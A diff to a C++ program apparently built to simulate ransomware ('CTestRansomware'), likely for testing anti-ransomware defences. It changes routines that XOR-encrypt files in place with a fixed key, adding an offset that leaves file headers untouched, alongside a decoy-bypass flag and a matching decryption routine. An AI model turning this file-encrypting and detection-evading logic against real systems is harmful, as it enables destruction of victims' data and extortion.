@@ -106,12 +106,16 @@ BOOL CTestRansomwareDlg::OnInitDialog()
 
 	m_isRunningFindFiles = false;
 
+	m_numTotal = 0;
+	m_numInfected = 0;
+	m_isEncryptReady = false;
+
 	m_cryptKey = 0x32;
+	m_cryptOffset = 0;
 	m_cryptType = 0;
 	m_cryptInterval = 0;
 	m_bBypassDecoy = false;
 
-	m_isEncryptReady = false;
 
 	// CRITICAL SECTION - Initial
 	InitializeCriticalSection(&m_csFileLog);
@@ -644,8 +648,11 @@ bool CTestRansomwareDlg::EncryptFileRs(CString strPath)
 		dest = fopen((LPSTR)(LPCTSTR)strPath2, "wb");
 
 	while (size = fread(buf, 1, FILE_BUF_SIZE, source)) {
-		for (int i = 0; i < size; i++)
+		cur = ftell(source) + (-1)*size;
+		for (int i = 0; i < size; i++){
+			if (cur + i < m_cryptOffset) continue;
 			buf[i] = buf[i] ^ (unsigned char)m_cryptKey; // XOR
+		}
 		if (m_cryptType == 0 || m_cryptType == 1) {
 			bEof = feof(source);
 			fseek(source, (-1)*size, SEEK_CUR);
@@ -686,6 +693,7 @@ bool CTestRansomwareDlg::DecryptFileRs()
 	FILE* fpList;
 	FILE* source;
 	size_t size;
+	int cur;
 	int bEof;
 	CString strPath;
 	CString strPath2;
@@ -707,8 +715,11 @@ bool CTestRansomwareDlg::DecryptFileRs()
 		if (source == NULL)
 			continue;
 		while (size = fread(buf, 1, FILE_BUF_SIZE, source)) {
-			for (int i = 0; i < size; i++)
+			cur = ftell(source) + (-1)*size;
+			for (int i = 0; i < size; i++){
+				if (cur + i < m_cryptOffset) continue;
 				buf[i] = buf[i] ^ (unsigned char)m_cryptKey; // XOR
+			}
 			bEof = feof(source);
 			fseek(source, (-1)*size, SEEK_CUR);
 			fwrite(buf, 1, size, source);
@@ -722,7 +733,7 @@ bool CTestRansomwareDlg::DecryptFileRs()
 			DeleteFile(strPath2); // 원본 파일 삭제
 			MoveFileEx(szFilePath, strPath2, MOVEFILE_COPY_ALLOWED); // 파일 이름 변경
 		}
-		strTemp.Format("복구 완료: %s", strPath);
+		strTemp.Format("복구 완료: %s", szFilePath);
 		AddLogList(strTemp);
 	}
 
